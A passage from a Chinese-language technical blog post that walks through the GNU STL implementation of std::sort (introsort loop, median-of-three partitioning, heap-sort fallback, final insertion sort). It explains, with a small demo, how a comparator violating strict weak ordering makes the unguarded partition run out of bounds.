<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面就从这两个限制点继续讲解。</p><h5 id="s_threshold">_S_threshold</h5><p>下面，开始讲解第【1】个限制条件<code>_S_threshold</code>。</p><p>我们把先深度限制条件<code>__depth_limit</code>去掉，只看快排部分。那么<code>__introsort_loop</code>函数的<code>while</code>循环可简洁如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token keyword">while</span> <span class="token punctuation">(</span>__last <span class="token operator">-</span> __first <span class="token operator">&gt;</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">// ...</span>     <span class="token comment">// 寻找分割区间的轴点</span>   <span class="token keyword">auto</span> __cut <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">__unguarded_partition_pivot</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 在右分支递归</span>   std<span class="token double-colon punctuation">::</span><span class="token function">__introsort_loop</span><span class="token punctuation">(</span>__cut<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __depth_limit<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 进入左分支</span>   __last <span class="token operator">=</span> __cut<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有没有发现，这个快排的实现异常简洁？</p><p>在<code>__introsort_loop</code>函数实现中，第一眼看上去似乎只有右分支递归，而忽略了左侧分支？</p><p><strong>这一切都是为了效率</strong>。</p><p>STL将 <code>__introsort_loop</code>放在了<code>while</code>循环中，寻找到分割<code>[__first, __last)</code>区间的分割点<code>__cut</code>后，每次先进入右分支递归，在右侧分支递归回来之后，下一步是：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">__last <span class="token operator">=</span> __cut<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，<strong>在下一个循环中进入左分支</strong>。</p><p>相比较常规快排实现，最直观的感受，就是减少一次函数调用的开销。此外，进入左分支后，可能就不满足<code>__last - __first &gt; int(_S_threshold)</code>限制条件，那么当前循环就退出了，避免递归。</p><p>因此，当<code>__introsort_loop</code>函数因不满足<code>_S_threshold</code>阈值条件，逐层返回到<code>std::__sort</code>函数中时，完整的<code>[__first, __last)</code>区间中会有许多元素个数小于<code>_S_threshold</code>的无序区间，他们的有序性留给最后的插入排序<code>__final_insertion_sort</code>函数来完成。</p><h5 id="std__unguarded_partition_pivot">std::__unguarded_partition_pivot</h5><p>快排的最后一点，我们来看看STL是如何寻找分割位置<code>__cut</code>的。这一部分是由<code>__unguarded_partition_pivot</code>函数实现。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">inline</span> _RandomAccessIterator<span class="token function">__unguarded_partition_pivot</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span>                            _RandomAccessIterator __last<span class="token punctuation">,</span>                            _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 中间位置</span>  _RandomAccessIterator __mid <span class="token operator">=</span> __first <span class="token operator">+</span> <span class="token punctuation">(</span>__last <span class="token operator">-</span> __first<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment">// 取三点的中值，并置于 __first 处</span>  std<span class="token double-colon punctuation">::</span><span class="token function">__move_median_to_first</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span>                               __first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> __mid<span class="token punctuation">,</span> __last <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span>                              __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 对 [__first, __last) 进行分割，并返回分割点 __cut</span>  <span class="token keyword">return</span> std<span class="token double-colon punctuation">::</span><span class="token function">__unguarded_partition</span><span class="token punctuation">(</span>__first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __first<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__unguarded_partition_pivot</code>的实现分为两步：</p><ol type="1"><li>选择一个轴点<code>pivot</code>，用于后续比较。</li><li>基于该轴点<code>pivot</code>分割<code>[__first, __last)</code>区间，使得<code>[__first, __cut)</code>区间的元素不大于<code>pivot</code>，<code>[__cut, __last)</code>区间的元素不小于<code>pivot</code>。</li></ol><p>下面从这两点进行讲解。</p><h5 id="std__move_median_to_first">std::__move_median_to_first</h5><p><code>__move_median_to_first</code>函数，用意很明显，就是找出<code>__a</code>、<code>__b</code>、<code>__c</code>的中值，并将这个中值放在<code>__result</code>位置处。因此，根据传入参数，就是找出<code>__first+1</code>、<code>__mid</code>、<code>__last-1</code>三个位置的中值，并将中值和<code>__first</code>位置的值进行交换。</p><p>这个函数比较简单，其中的<code>iter_swap</code>函数是交换两个迭代器指向的值，具体代码解释如下。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_Iterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">void</span><span class="token function">__move_median_to_first</span><span class="token punctuation">(</span>_Iterator __result<span class="token punctuation">,</span>                        _Iterator __a<span class="token punctuation">,</span> _Iterator __b<span class="token punctuation">,</span> _Iterator __c<span class="token punctuation">,</span>                        _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// __a &lt; __b </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__a<span class="token punctuation">,</span> __b<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">// __a &lt; __b &lt; __c </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__b<span class="token punctuation">,</span> __c<span class="token punctuation">)</span><span class="token punctuation">)</span>        std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__result<span class="token punctuation">,</span> __b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// __b</span>    <span class="token comment">// __a &lt; __c  &lt;=  _b </span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__a<span class="token punctuation">,</span> __c<span class="token punctuation">)</span><span class="token punctuation">)</span>      std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__result<span class="token punctuation">,</span> __c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _c</span>    <span class="token keyword">else</span>     <span class="token comment">// __c &lt;= __a &lt; __b </span>      std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__result<span class="token punctuation">,</span> __a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// _a</span>  <span class="token punctuation">}</span>  <span class="token comment">// __b &lt;= __a &lt; __c</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__a<span class="token punctuation">,</span> __c<span class="token punctuation">)</span><span class="token punctuation">)</span>    std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__result<span class="token punctuation">,</span> __a<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// __a</span>   <span class="token comment">// __b &lt;= c &lt;= a</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__b<span class="token punctuation">,</span> __c<span class="token punctuation">)</span><span class="token punctuation">)</span>    std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__result<span class="token punctuation">,</span> __c<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// _c</span>  <span class="token keyword">else</span>   <span class="token comment">// __c &lt;= _b &lt;= __a</span>    std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__result<span class="token punctuation">,</span> __b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// _b</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="std__unguarded_partition">std::__unguarded_partition</h5><p>上面找到待比较的轴点<code>pivot</code>之后，下面就是分割<code>[__first, __last)</code>区间。</p><p><strong>分割的核心思想</strong>：寻找分割位置<code>__cut</code>，使得<code>[__first, __cut)</code>区间的元素都不大于<code>pviot</code>，<code>[__cut, __last)</code>区间的元素都不小于<code>pivot</code>，然后返回分割点<code>__cut</code>的位置。</p><p>这部分代码讲解，见下面代码注释。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span>_RandomAccessIterator<span class="token function">__unguarded_partition</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span> _RandomAccessIterator __last<span class="token punctuation">,</span>                      _RandomAccessIterator __pivot<span class="token punctuation">,</span>                       _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __pivot<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">++</span>__first<span class="token punctuation">;</span> <span class="token comment">// *__first &lt; *__pivot </span>    <span class="token comment">/*** 跳出循环时，满足：*__first &gt;= *__pivot  ***/</span>    <span class="token operator">--</span>__last<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__pivot<span class="token punctuation">,</span> __last<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">--</span>__last<span class="token punctuation">;</span> <span class="token comment">// *__pivot &lt; *__last</span>    <span class="token comment">/*** 跳出循环时，满足：*__pivot &gt;= *__last  ***/</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>__first <span class="token operator">&lt;</span> __last<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">// __fist &gt;= __last ，表示左右边界相遇，此轮遍历结束</span>      <span class="token keyword">return</span> __first<span class="token punctuation">;</span>        <span class="token comment">// 返回分割点位置</span>         <span class="token comment">/**  经过上面两个while循环，     *   此时： *__first &gt;= *__pivot &amp;&amp;  *__pivot &gt;= *__last     *   不满足分割要求，因此需要交换__first, __last 两点的值     */</span>    std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">++</span>__first<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>by the way</strong></p><p><code>__unguarded_partition</code>函数，有个<code>__unguarded</code>前缀，<strong>表示这个函数里没有越界检测</strong>。</p><p>那么问题来了，为什么可以没有越界检测？</p><p>以<code>pivot</code>左侧的区间为例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 无越界检测版本</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __pivot<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">++</span>__first<span class="token punctuation">;</span>      <span class="token comment">// 常见实现版本</span><span class="token keyword">while</span> <span class="token punctuation">(</span>__first <span class="token operator">&lt;</span> __last <span class="token operator">&amp;&amp;</span> <span class="token function">__comp</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __pivot<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">++</span>__first<span class="token punctuation">;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先，明确两点：</p><ul><li><code>__unguarded_partition</code>中传入参数<code>__first</code>，实际上是<code>__unguarded_partition_pivot</code>函数中的<code>__first+1</code>位置；</li><li><code>__unguarded_partition</code>中传入参数<code>__pivot</code>，实际上是<code>__unguarded_partition_pivot</code>函数中的<code>__first</code>位置。</li></ul><p><code>__pivot</code>是<code>__unguarded_partition_pivot</code>函数中的三个点（<code>__first+1</code>、<code>__mid</code>、<code>__last-1</code>）的中值，即<code>__pivot</code>值肯定并不是最大的。</p><p>因此，在<code>__unguarded_partition</code>函数中：</p><ol type="1"><li><code>++__first</code>时，肯定存在一个点<code>__pos</code>，其值不小于<code>__pivot</code>处的值；</li><li>要使得<code>__comp(__first, __pivot)</code>为<code>true</code>，必须是<code>*__first &lt; *__pivot</code>；</li><li>又因为至少存在一个点<code>__pos</code>，满足<code>*__pos &gt;= *__pivot</code>，使得<code>__comp(__first, __last)</code>为false，</li></ol><p>因此，<code>__first &gt; __last</code>的越界情况就不会发生，最终<code>__first</code>会在某个位置停下。同理右侧区间的判断。</p><p>因此，即使不要边界检测，也不会发生越界错误。</p><h4 id="隐藏的bug">隐藏的BUG</h4><p>但是注意了，<code>__unguarded_partition</code>函数，没有引入边界检测仍能正确运行，是基于正确的比较器算法。可当用户传入错误的比较器算法时，比如本文开篇自定义的比较器算法，就容易产生BUG，还是难以检测的BUG。</p><p>打开<code>cppreference</code>，可以看到STL要求<code>std::sort</code>的比较器是符合严格弱序性质的，其中容易导致BUG的是这么一条：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\640.webp"></p><p><strong>当比较器对象<code>comp</code>传入两个相等对象，返回值必须是<code>false</code>！！！</strong></p><p>如果不符合严格弱序性质，则会在某些数据下会导致coredump。</p><p>假设某个小区间，数据分布如下：</p><pre class="line-numbers language-none"><code class="language-none">数据：1   1   1   2   索引：0   1   2   3  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>按照<code>__move_median_to_first</code>函数中的轴点选择法，最终选出的<code>pivot</code>是索引为1处的值，然后索引0、1处的值互换，将轴点置于first处。</p><p>下面基于不同的比较器算法来寻找分割点__cut位置。</p><blockquote><p>为便于下文分析叙述：<code>pivot</code>简写为<code>p</code>，<code>first</code>简写为<code>f</code>，<code>last</code>简写为<code>l</code>。</p></blockquote><p><strong>Case1：比较器符合严格弱序关系</strong></p><p>当<code>std::sort</code>传入的比较器Compare符合严格弱序关系，对该数据执行到<code>__unguarded_partition</code>函数时，迭代流程如下：</p><p>第一轮迭代后：</p><pre class="line-numbers language-none"><code class="language-none">数据：1   1   1   2    索引：0   1   2   3        ^   ^   ^        p   f   l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第二轮迭代后：</p><p>此时<code>last</code>指针，到了<code>first</code>指针位置，迭代结束。</p><pre class="line-numbers language-none"><code class="language-none">数据：1   1   1   2   索引：0   1   2   3       ^   ^           p  f/l  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时，分割点<code>__cut</code>就是<code>first</code>指针位置，其左侧的元素不比<code>pivot</code>大，其右侧不比<code>pivot</code>小。</p><p><strong>Case 2：比较器不符合严格弱序关系</strong></p><p>当<code>std::sort</code>传入的比较器Compare不符合严格弱序关系，即<code>comp(a,a)==true</code>，再执行到<code>__unguarded_partition_pivot</code>函数时，迭代流程如下：</p><p>第一轮迭代：</p><p>实际上，在第一轮迭代中，<code>last</code>指针就越界了。</p><p>因为<code>last</code>在左移的过程中，其取值依次是<code>2</code>、<code>1</code>、<code>1</code>、<code>1</code>，都会使得<code>comp(pivot, last)</code>返回<code>true</code>，进而导致语句<code>while (__comp(__pivot, __last)) --__last;</code>一直执行，最终就导致<code>last</code>越界。</p><pre class="line-numbers language-none"><code class="language-none">数据：1   1   1   2   索引：0   1   2   3       ^   ^           p   f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>总结来说，严格弱序关系，能保证 ：</p><ol type="1"><li><p><code>while (__comp(__first, __pivot)) ++__first;</code>在<code>++__first</code>的过程中，不会越界。</p><p>原理还是上面分析的那样，即使<code>__first+1</code>、<code>__mid</code>、<code>__last-1</code>三个值都是相等，取得的轴点<code>pivot</code>在弱序关系中，使得<code>comp(__first, __pivot)</code>一直为false，这样while循环就进行不下去。</p><p>如果没有严格弱序关系保证，则就会越界。</p></li><li><p><code>while (__comp(__pivot, __last)) --__last;</code></p><p>原理同上。</p></li></ol><p>为了验证上面这个猜想，我自己写了个demo。</p><p>在数组<code>vec</code>里全是一样的数字，数组元素个数必须超过<code>_S_threshold</code>阈值（默认值16）才能触发<code>std::sort</code>的快排行为。</p><p>注意，代码必须在MSVC下编译运行，因为GCC对于某些越界行为并不报错，不如MSVC严格（没有测试clang）。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> vec<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">// 全是一样的元素，且必须超过16个元素</span>    std<span class="token double-colon punctuation">::</span><span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> lhs<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span>             <span class="token punctuation">{</span>                <span class="token keyword">return</span> lhs <span class="token operator">&lt;=</span> rhs<span class="token punctuation">;</span> <span class="token comment">// BUG，修改为: return lhs &lt; rhs; 才行</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="depth_limit">__depth_limit</h4><p>好嘞，下面开始讲解第【2】个限制条件<code>__depth_limit</code>。</p><p>当快排的递归深度，达到阈值<code>__depth_limit</code>时，STL使用堆完成当前<code>[__first, __last)</code>区间的排序。下面我们把快排部分去掉，只看堆排序部分，那么<code>__introsort_loop</code>函数的<code>while</code>循环可简洁如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span>__last <span class="token operator">-</span> __first <span class="token operator">&gt;</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>__depth_limit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      std<span class="token double-colon punctuation">::</span><span class="token function">__partial_sort</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显而易见，堆排是由<code>__partial_sort</code>函数完成。</p><h5 id="std__partial_sort">std::__partial_sort</h5><p><code>__partial_sort</code>函数，旨在取出<code>[__first, __last)</code>区间前<code>__middle - _frist</code>个最小元素，并将其按照<code>_Cpmpare</code>比较策略进行排序后，有序存放在<code>[__first, __middle)</code>区间，其余的节点放在<code>[__middle, __last)</code>区间。</p><p><code>__partial_sort</code>函数实现如下（关于堆的实现，可以参考侯捷老师的《STL源码剖析》书籍）。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 上层调用</span>std<span class="token double-colon punctuation">::</span><span class="token function">__partial_sort</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 函数原型</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">inline</span> <span class="token keyword">void</span><span class="token function">__partial_sort</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span>               _RandomAccessIterator __middle<span class="token punctuation">,</span>               _RandomAccessIterator __last<span class="token punctuation">,</span>               _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 先建堆，并使 [first, middle) 区间存放前 middle-first 个最小值</span>  std<span class="token double-colon punctuation">::</span><span class="token function">__heap_select</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __middle<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 对 [first, middle) 区间元素进行排序</span>  std<span class="token double-colon punctuation">::</span><span class="token function">__sort_heap</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __middle<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，经过 <code>__partial_sort</code>函数后：</p><ul><li><code>[__first, __middle)</code>区间，有序存储了<code>[__first, __last)</code>区间的前<code>__middle - _frist</code>个最小元素；</li><li><code>[__middle, __last)</code>区间，无序存储<code>[__first, __last)</code>区间剩余元素。</li></ul><p>在 <code>__introsort_loop</code> 函数中调用<code>__partial_sort</code>函数时，<code>__middle</code>参数和<code>__last</code>参数都是<code>__last</code>，因此实现的就是<code>[__first, __last)</code>区间的全排序。</p><h5 id="std__final_insertion_sort">std::__final_insertion_sort</h5><p>当 <code>__introsort_loop</code>函数执行完毕，最后一步需要将整个数据变得有序，这由<code>__final_insertion_sort</code>函数完成。</p><p>在讨论 <code>__final_insertion_sort</code>之前，先回顾下<code>__introsort_loop</code>函数，它返回有两种可能：</p><ol type="1"><li><p><code>_S_threshold</code>：递归到某个<code>[__first, __last)</code>区间时，其元素个数<code>__last - __first &lt;= _S_threshold</code>时，结束递归。</p><p><code>__introsort_loop</code>函数返回到<code>std::__sort</code>函数时，整个大的区间中还存在一些元素个数不足<code>_S_threshold</code>的小区间仍然是无序的。</p></li><li><p><code>__depth_limit</code>：递归层次超过限制<code>__depth_limit</code>。</p></li></ol><p>因此，当执行<code>__final_insertion_sort</code>函数时，当前大区间<code>[__first, __last)</code>只存在局部无序，主体上是有序的。这种情况，非常适用于插入排序，此时时间复杂度是<code>O(N)</code>。</p><p>为了进一步优化，加速排序的速度，STL针对两种情况分别求解。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">void</span><span class="token function">__final_insertion_sort</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span>                       _RandomAccessIterator __last<span class="token punctuation">,</span>                        _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 大数据量</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__last <span class="token operator">-</span> __first <span class="token operator">&gt;</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    std<span class="token double-colon punctuation">::</span><span class="token function">__insertion_sort</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __first <span class="token operator">+</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span><span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span><span class="token function">__unguarded_insertion_sort</span><span class="token punctuation">(</span>__first <span class="token operator">+</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span><span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>   <span class="token comment">// 小数量量直接使用插入排序，不用经过快排、堆排</span>    std<span class="token double-colon punctuation">::</span><span class="token function">__insertion_sort</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="std__insertion_sort">std::__insertion_sort</h5><p><code>__insertion_sort</code>函数是按照标准的插入排序实现。</p><p><strong>插入排序的核心思想</strong>：将整个序列视为两个部分，『有序的前缀』和『无序的后缀』，再通过循环迭代，不断地将后缀的首元素转移插入到前缀中，保持前缀仍然有序。当后缀为空，整个序列有序。</p><blockquote><p>时间复杂度：如果当前序列已经完全有序，则插入排序时间复杂度是<code>O(N)</code>，完全逆序则<code>O(N^2)</code>。</p></blockquote><p>运行到<code>__insertion_sort</code>时，整个数据规模主体保持有序，局部小区间无序，非常适合使用插入排序，算法步骤如下：</p><ul><li>初始状态下，前缀序列中只有<code>__first</code>一个元素，后缀序列则是<code>[__first+1, __last)</code>区间的元素；</li><li>对<code>[__first+1, __last)</code>区间的元素进行遍历，不断将后缀序列的首元素，插入到前缀序列中。</li></ul><p>在<code>__insertion_sort</code>函数中，对于后缀序列<code>[__first+1, __last)</code>区间的每个元素<code>__i</code>：</p><ul><li><p>先判断<code>__i</code>位置的元素是否小于<code>__first</code>；</p><p>如果是，则直接将<code>[__first, 